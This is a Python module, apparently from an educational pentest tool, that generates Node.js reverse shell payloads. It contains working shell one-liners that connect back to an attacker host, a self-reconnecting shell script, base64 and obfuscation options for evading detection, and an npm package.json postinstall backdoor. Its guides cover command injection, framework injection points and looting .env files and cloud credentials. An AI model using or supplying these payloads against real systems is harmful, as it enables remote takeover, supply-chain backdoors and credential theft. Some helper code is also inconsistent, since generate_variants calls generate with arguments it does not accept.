"""
Node.js reverse shell payload generator
"""

from .base import PayloadGenerator, PayloadConfig, PayloadExplanation
from learnshells.utils.logger import Logger
from typing import Dict


class NodeJSGenerator(PayloadGenerator):
    """Generate Node.js reverse shell payloads."""
# ========== GENERATE METHOD - FIXED ==========
    def generate(self, encode: bool = False, obfuscate: bool = False) -> str:
        """
        Generate Node.js reverse shell payload.
        
        Args:
            encode: Whether to encode
            obfuscate: Whether to obfuscate
            
        Returns:
            Node.js payload string
        """
        # Get lhost and lport from config
        lhost = self.config.lhost
        lport = self.config.lport
        
        # Check if logger exists
        if not hasattr(self, 'logger'):
            self.logger = Logger()
        
        # Generate the reverse shell
        payload = self._generate_reverse_shell()
        
        if obfuscate:
            payload = self._obfuscate(payload)
        
        if encode:
            import base64
            encoded = base64.b64encode(payload.encode()).decode()
            payload = f"node -e 'eval(Buffer.from(\"{encoded}\",\"base64\").toString())'"
        
        self.logger.success(
            f"Generated Node.js payload ({len(payload)} bytes)",
            explain="Node.js is extremely common on modern web servers and perfect for reverse shells. "
                   "It's found on virtually all JavaScript backend servers."
        )
        
        return payload
# ========== REVERSE SHELL METHOD - FIXED ==========
    def _generate_reverse_shell(self) -> str:
        """Generate standard Node.js reverse shell one-liner."""
        lhost = self.config.lhost
        lport = self.config.lport
        
        payload = f"""node -e '(function(){{var net = require("net"),cp = require("child_process"),sh = cp.spawn("/bin/sh", []);var client = new net.Socket();client.connect({lport}, "{lhost}", function(){{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}});return /a/;}})()'"""
        return payload

    def _generate_simple_reverse(self) -> str:
        """Generate simple Node.js reverse shell using bash."""
        lhost = self.config.lhost
        lport = self.config.lport
        payload = f"""node -e 'require("child_process").exec("bash -c \\'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\\'")'"""
        return payload
    
    def _generate_full_reverse(self) -> str:
        """Generate full-featured Node.js reverse shell script."""
        lhost = self.config.lhost
        lport = self.config.lport
        payload = f"""const net = require('net');
const spawn = require('child_process').spawn;
const HOST = '{lhost}';
const PORT = {lport};
function connect() {{
    const client = new net.Socket();
    
    client.connect(PORT, HOST, function() {{
        console.log('Connected to ' + HOST + ':' + PORT);
        
        const sh = spawn('/bin/sh', ['-i']);
        
        client.write('Shell connected!\\n');
        
        // Pipe streams
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
        
        sh.on('exit', function(code, signal) {{
            client.end('Shell process exited\\n');
        }});
    }});
    
    client.on('error', function(e) {{
        console.error('Connection error:', e.message);
        setTimeout(connect, 5000); // Reconnect after 5 seconds
    }});
    
    client.on('close', function() {{
        console.log('Connection closed');
        setTimeout(connect, 5000); // Reconnect after 5 seconds
    }});
}}
connect();"""
        return payload
    
    def _generate_windows_reverse(self) -> str:
        """Generate Node.js reverse shell for Windows."""
        lhost = self.config.lhost
        lport = self.config.lport
        payload = f"""node -e '(function(){{var net = require("net"),cp = require("child_process"),sh = cp.spawn("cmd.exe", []);var client = new net.Socket();client.connect({lport}, "{lhost}", function(){{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}});}})()'"""
        return payload
    
    def _generate_nodejs_alt_command(self) -> str:
        """Generate payload for systems using 'nodejs' instead of 'node'."""
        lhost = self.config.lhost
        lport = self.config.lport
        payload = f"""nodejs -e '(function(){{var net = require("net"),cp = require("child_process"),sh = cp.spawn("/bin/sh", []);var client = new net.Socket();client.connect({lport}, "{lhost}", function(){{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}});}})()'"""
        return payload
    
    def _obfuscate(self, payload: str) -> str:
        """Basic obfuscation for Node.js payload."""
        # String splitting and concatenation
        obfuscated = payload
        obfuscated = obfuscated.replace('require', '["req"+"uire"]')
        obfuscated = obfuscated.replace('"net"', '"n"+"et"')
        obfuscated = obfuscated.replace('"child_process"', '"child_"+"process"')
        return obfuscated
# ========== END ALL METHODS ==========
    def explain(self, payload: str) -> str:
        """
        Explain Node.js payload line by line.
        
        Args:
            payload: Node.js payload
            
        Returns:
            Educational explanation
        """
        explanation = """
ðŸŽ“ NODE.JS REVERSE SHELL EXPLAINED:

Part 1: Wrap in IIFE (Immediately Invoked Function Expression)
    (function() { ... })()
    Wraps code in anonymous function and executes immediately.
    Keeps variables scoped and avoids polluting global namespace.
    The return /a/; at end is just to satisfy syntax.

Part 2: Import Required Modules
    var net = require("net");
    var cp = require("child_process");
    
    â€¢ net: Node's built-in networking module (TCP/UDP sockets)
    â€¢ child_process: Module for spawning processes
    â€¢ require(): Node's module loading function
    
    Both are core modules - always available, no npm install needed!

Part 3: Spawn Shell Process
    sh = cp.spawn("/bin/sh", []);
    
    Creates a new shell process:
    â€¢ cp.spawn(): Asynchronously spawn child process
    â€¢ "/bin/sh": Path to shell binary
    â€¢ []: Empty array of arguments (we want interactive shell)
    â€¢ Returns: ChildProcess object with stdin, stdout, stderr streams

Part 4: Create TCP Socket
    client = new net.Socket();
    
    Creates a new TCP socket object.
    Socket is a duplex stream (both readable and writable).
    This will be our network connection back to attacker.

Part 5: Connect to Listener
    client.connect(PORT, "HOST", function() { ... });
    
    Initiates TCP connection:
    â€¢ PORT: Your listener port (e.g., 443)
    â€¢ "HOST": Your IP address
    â€¢ function(): Callback executed when connection succeeds
    
    This is asynchronous - callback runs when connected.

Part 6: Pipe Streams Together
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
    
    The magic of Node.js streams!
    
    Flow 1: You type command â†’ client receives â†’ pipes to sh.stdin â†’ shell executes
    Flow 2: Shell output â†’ sh.stdout â†’ pipes to client â†’ you see output
    Flow 3: Shell errors â†’ sh.stderr â†’ pipes to client â†’ you see errors
    
    .pipe() connects readable stream to writable stream:
    â€¢ client is duplex (read/write)
    â€¢ sh.stdin is writable only
    â€¢ sh.stdout and sh.stderr are readable only

STREAM TYPES:
    Readable: Can read data from (stdout, stderr, file read)
    Writable: Can write data to (stdin, file write)
    Duplex: Can both read and write (sockets, TTY)
    Transform: Special duplex that modifies data

WINDOWS VERSION:
    sh = cp.spawn("cmd.exe", []);
    
    Same concept, different shell:
    â€¢ Windows uses cmd.exe instead of /bin/sh
    â€¢ Streams work identically
    â€¢ Everything else is the same

SIMPLE VERSION (Using bash):
    require("child_process").exec("bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'")
    
    This version:
    â€¢ Uses .exec() instead of .spawn()
    â€¢ Executes bash directly with /dev/tcp trick
    â€¢ Simpler but less flexible
    â€¢ Single line of code

FULL FEATURED VERSION:
Includes additional features:
    â€¢ Connection success message
    â€¢ Automatic reconnection on error
    â€¢ Exit handling for shell process
    â€¢ Error logging
    â€¢ setTimeout for retry logic

WHY NODE.JS?
âœ“ Ubiquitous on modern web servers
âœ“ Built-in on many platforms
âœ“ Non-blocking async I/O (very fast)
âœ“ Rich ecosystem (npm)
âœ“ Cross-platform (Linux/Windows/Mac)
âœ“ JavaScript is easy to read/modify

WHEN TO USE NODE.JS:
âœ“ Express.js servers
âœ“ Next.js applications
âœ“ NestJS backends
âœ“ Modern web APIs
âœ“ Serverless functions (AWS Lambda, etc.)
âœ“ Electron apps
âœ“ JavaScript-heavy environments

COMMON NODE.JS LOCATIONS:
â€¢ /usr/bin/node
â€¢ /usr/local/bin/node
â€¢ /usr/bin/nodejs (older Debian/Ubuntu)
â€¢ ~/.nvm/versions/node/v*/bin/node (nvm)
â€¢ /opt/node/bin/node
â€¢ C:\\Program Files\\nodejs\\node.exe (Windows)

NODE VS NODEJS COMMAND:
Some systems use 'nodejs' instead of 'node':
â€¢ Debian/Ubuntu historically used 'nodejs'
â€¢ Most modern systems use 'node'
â€¢ Both work the same way
â€¢ Try: node -v or nodejs -v

ADVANTAGES OVER OTHER LANGUAGES:
â€¢ More common than Ruby/Perl on modern systems
â€¢ Easier syntax than Perl
â€¢ Better async handling than Python 2
â€¢ Native on JavaScript-based infrastructure
â€¢ npm ecosystem is massive

DETECTION & EVASION:
Low Detection:
â€¢ Node.js is legitimate on web servers
â€¢ Process looks normal (node process)
â€¢ Network connection is just TCP

Higher Detection:
â€¢ child_process.spawn might be logged
â€¢ Some EDR watches for suspicious node usage
â€¢ File system access might trigger alerts

Evasion Tips:
â€¢ Encode payload with base64
â€¢ Obfuscate require() calls
â€¢ Use string concatenation
â€¢ Hide in legitimate-looking npm package
"""
        return explanation
    
    def generate_variants(self, lhost: str, lport: int) -> dict:
        """
        Generate multiple Node.js payload variants.
        
        Args:
            lhost: Local host IP
            lport: Local port
            
        Returns:
            Dict of payload variants
        """

        self.lhost = lhost
        self.lport = lport
        
        variants = {}
        
        # Standard one-liner
        variants['standard'] = self._generate_reverse_shell()
        
        # Simple bash-based version
        variants['simple'] = self._generate_simple_reverse()
        
        # Full featured script
        variants['full'] = self._generate_full_reverse()
        
        # Windows version
        variants['windows'] = self._generate_windows_reverse()
        
        # Nodejs command (for old Debian/Ubuntu)
        variants['nodejs_cmd'] = self._generate_nodejs_alt_command()
        
        # Base64 encoded
        variants['encoded'] = self.generate(lhost, lport, encode=True)
        
        # Obfuscated
        variants['obfuscated'] = self.generate(lhost, lport, obfuscate=True)
        
        return variants
    
    def get_usage_instructions(self) -> str:
        """Get instructions for using Node.js payloads."""
        instructions = """
ðŸ“‹ NODE.JS PAYLOAD USAGE:

Method 1: Direct Execution
node -e 'YOUR_PAYLOAD'

Method 2: From File
echo 'YOUR_PAYLOAD' > shell.js
node shell.js

Method 3: Command Injection
; node -e '(function(){var net=require("net")...'

Method 4: In Existing Node App
If you can inject into a running Node app:
const net = require('net');
// ... payload code

Method 5: npm/package.json Backdoor
Add to scripts in package.json:
"postinstall": "node -e 'YOUR_PAYLOAD'"

CHECKING AVAILABILITY:
# Check if Node.js is installed
which node
node --version

# Alternative command name
which nodejs
nodejs --version

# Check npm (usually comes with Node)
npm --version

COMMON LOCATIONS:
/usr/bin/node
/usr/local/bin/node
/usr/bin/nodejs
~/.nvm/versions/node/*/bin/node

TIPS:
â€¢ Use -e flag for inline code execution
â€¢ Single quotes prevent shell interpretation
â€¢ Try both 'node' and 'nodejs' commands
â€¢ Check Node version: node -v

PAYLOAD SELECTION GUIDE:
Standard: Best for most Linux systems (one-liner)
Simple: Shortest payload, uses bash
Full: Feature-rich with auto-reconnect
Windows: For Windows systems with Node
Encoded: For WAF/filter bypass
Obfuscated: For signature evasion

FRAMEWORK-SPECIFIC INJECTION:

Express.js:
app.get('/exploit', (req, res) => {
    require('child_process').exec('YOUR_PAYLOAD');
});

Next.js API Route:
export default function handler(req, res) {
    require('child_process').exec('YOUR_PAYLOAD');
}

Serverless Function:
exports.handler = async (event) => {
    require('child_process').exec('YOUR_PAYLOAD');
};

TROUBLESHOOTING:
Issue: "node: command not found"
Fix: Try 'nodejs' or install Node.js

Issue: "Cannot find module 'net'"
Fix: net is built-in, check Node installation

Issue: Connection fails immediately
Fix: Check firewall, use different port (443, 80)

Issue: Shell doesn't spawn
Fix: Try /bin/bash instead of /bin/sh

Issue: On Windows, shell not working
Fix: Use Windows variant with cmd.exe

ADVANTAGES:
âœ“ Very common on modern systems
âœ“ Non-blocking I/O (fast and efficient)
âœ“ Cross-platform compatibility
âœ“ Easy to obfuscate (JavaScript)
âœ“ Large ecosystem (npm)
âœ“ Legitimate process name

USE CASES:
âœ“ Modern web applications (Express, Next.js, NestJS)
âœ“ REST APIs
âœ“ GraphQL servers
âœ“ Websocket servers
âœ“ Serverless functions (Lambda, Cloud Functions)
âœ“ Build systems (Webpack, Vite, etc.)
âœ“ Development environments
âœ“ Electron applications
âœ“ CI/CD pipelines

DETECTION NOTES:
Low Risk:
â€¢ Node process is legitimate on web servers
â€¢ TCP connections are normal
â€¢ Built-in modules don't raise flags

Medium Risk:
â€¢ child_process usage might be logged
â€¢ Unusual network connections monitored
â€¢ Some EDR solutions watch Node.js spawning

High Risk:
â€¢ Multiple failed connection attempts
â€¢ Connections to known attacker IPs
â€¢ Process injection attempts
"""
        return instructions
    
    def test_availability(self) -> str:
        """Generate command to test if Node.js is available on target."""
        test_cmd = "which node || which nodejs && node --version 2>/dev/null || nodejs --version"
        
        self.logger.info(
            "Node.js availability test command generated",
            explain="This checks for both 'node' and 'nodejs' commands and shows version if found."
        )
        
        return test_cmd
    
    def get_framework_specific_notes(self) -> str:
        """Get framework-specific exploitation notes."""
        notes = """
NODE.JS FRAMEWORK EXPLOITATION:

Express.js:
Common in: REST APIs, web servers
Injection points:
â€¢ Route handlers: app.get(), app.post()
â€¢ Middleware functions
â€¢ Template engines (EJS, Pug)
â€¢ Query parameters via req.query
â€¢ Body parameters via req.body

Next.js:
Common in: Full-stack React apps
Injection points:
â€¢ API routes (/pages/api/*)
â€¢ getServerSideProps
â€¢ getStaticProps
â€¢ Middleware
â€¢ Server components (App Router)

NestJS:
Common in: Enterprise Node backends
Injection points:
â€¢ Controllers
â€¢ Services
â€¢ Guards
â€¢ Interceptors
â€¢ Pipes

Socket.io:
Common in: Real-time applications
Injection points:
â€¢ Socket event handlers
â€¢ Room broadcasts
â€¢ Namespace handlers

Electron:
Common in: Desktop applications
Injection points:
â€¢ IPC handlers (ipcMain)
â€¢ WebView components
â€¢ Node integration contexts

COMMON VULNERABLE PATTERNS:
1. Unsafe eval():
   eval(userInput) // DANGEROUS

2. child_process with user input:
   exec(userInput) // DANGEROUS
   
3. Template injection:
   template.render(userInput) // CAN BE DANGEROUS

4. Deserialization:
   JSON.parse(untrustedData) // CAN BE DANGEROUS
   
5. Code generation:
   new Function(userInput) // DANGEROUS

POST-EXPLOITATION:
Once you have shell, look for:
â€¢ package.json (dependencies, scripts)
â€¢ .env files (secrets, API keys)
â€¢ node_modules/ (installed packages)
â€¢ Database connection strings
â€¢ JWT secrets
â€¢ AWS credentials
â€¢ Docker secrets

Interesting Files:
â€¢ /app/package.json
â€¢ /app/.env
â€¢ /app/config/*
â€¢ /home/node/.npmrc
â€¢ /root/.npmrc
"""
        return notes
    
    def generate_npm_backdoor(self, lhost: str, lport: int) -> dict:
        """Generate npm package backdoor for persistence."""
        package_json = {
            "name": "backdoor-package",
            "version": "1.0.0",
            "scripts": {
                "postinstall": f"node -e '(function(){{var net=require(\"net\"),cp=require(\"child_process\"),sh=cp.spawn(\"/bin/sh\",[]);var client=new net.Socket();client.connect({lport},\"{lhost}\",function(){{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}});}})()'"
            }
        }
        
        self.logger.info(
            "Generated npm backdoor package.json",
            explain="This package.json includes a postinstall script that triggers a reverse shell. "
                   "When anyone runs 'npm install', the shell connects back automatically."
        )
        
        return package_json
        
# ========== TEST REQUIREMENTS METHOD ==========
    def test_requirements(self, target_info: Dict) -> bool:
        """
        Test if target meets requirements for Node.js payload.
        
        Args:
            target_info: Target information dictionary
            
        Returns:
            True if requirements met
        """
        # Check if Node.js/JavaScript is detected
        if 'technologies' in target_info:
            techs = target_info.get('technologies', [])
            if any(tech.lower() in ['nodejs', 'node.js', 'node', 'javascript', 'express'] for tech in techs):
                return True
        
        # Check web server for Node hints
        web_server = target_info.get('web_server', '').lower()
        if 'node' in web_server or 'express' in web_server:
            return True
        
        # Node.js is becoming very common
        return True
# ========== END TEST REQUIREMENTS ==========
